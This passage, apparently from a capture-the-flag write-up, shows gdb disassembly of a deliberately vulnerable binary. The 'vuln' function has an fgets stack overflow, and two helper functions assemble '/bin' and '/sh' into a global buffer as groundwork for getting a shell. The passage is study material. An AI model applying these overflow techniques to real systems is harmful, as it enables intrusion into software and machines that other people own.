</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001332</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d27</span><span class="p">]</span>        <span class="c1"># 0x4060 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001339</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000133d</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001342</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001345</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1070</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000134a</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000134e</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x135e</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001350</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xd91</span><span class="p">]</span>        <span class="c1"># 0x20e8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001357</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000135c</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x136b</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">77</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000135e</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xdb3</span><span class="p">]</span>        <span class="c1"># 0x2118
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001365</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136a</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136b</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000136c</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>The vuln function was calling the fgets and the given size to the fgets more than the buffer could hold, so it was a stack overflow. Secondly, there were two other functions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">california</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">california</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011dc</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011dd</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011e0</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe72</span><span class="p">]</span>        <span class="c1"># 0x2059
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011e7</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011ec</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe85</span><span class="p">]</span>        <span class="c1"># 0x2078
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011f3</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011f8</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e7a</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011fe</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001200</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e69</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001207</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x2f</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000120b</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e67</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001211</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001214</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e5e</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000121a</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e58</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001220</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001222</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e47</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001229</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x62</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000122d</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e45</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001233</span> <span class="err">&lt;+</span><span class="mi">87</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001236</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e3c</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000123c</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e36</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001242</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001244</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e25</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000124b</span> <span class="err">&lt;+</span><span class="mi">111</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x69</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000124f</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e23</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001255</span> <span class="err">&lt;+</span><span class="mi">121</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001258</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e1a</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000125e</span> <span class="err">&lt;+</span><span class="mi">130</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e14</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001264</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001266</span> <span class="err">&lt;+</span><span class="mi">138</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e03</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000126d</span> <span class="err">&lt;+</span><span class="mi">145</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x6e</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001271</span> <span class="err">&lt;+</span><span class="mi">149</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e01</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001277</span> <span class="err">&lt;+</span><span class="mi">155</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000127a</span> <span class="err">&lt;+</span><span class="mi">158</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2df8</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001280</span> <span class="err">&lt;+</span><span class="mi">164</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001281</span> <span class="err">&lt;+</span><span class="mi">165</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001282</span> <span class="err">&lt;+</span><span class="mi">166</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">silicon_valley</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">silicon_valley</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001283</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001284</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001287</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe25</span><span class="p">]</span>        <span class="c1"># 0x20b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000128e</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001293</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ddf</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001299</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000129b</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dce</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012a2</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x2f</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012a6</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dcc</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ac</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012af</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dc3</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012b5</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dbd</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012bb</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000012bd</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dac</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012c4</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x73</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012c8</span> <span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2daa</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ce</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012d1</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2da1</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012d7</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d9b</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012dd</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000012df</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d8a</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012e6</span> <span class="err">&lt;+</span><span class="mi">99</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x68</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012ea</span> <span class="err">&lt;+</span><span class="mi">103</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d88</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012f0</span> <span class="err">&lt;+</span><span class="mi">109</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012f3</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d7f</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012f9</span> <span class="err">&lt;+</span><span class="mi">118</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d79</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ff</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001301</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d68</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001308</span> <span class="err">&lt;+</span><span class="mi">133</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x0</span>
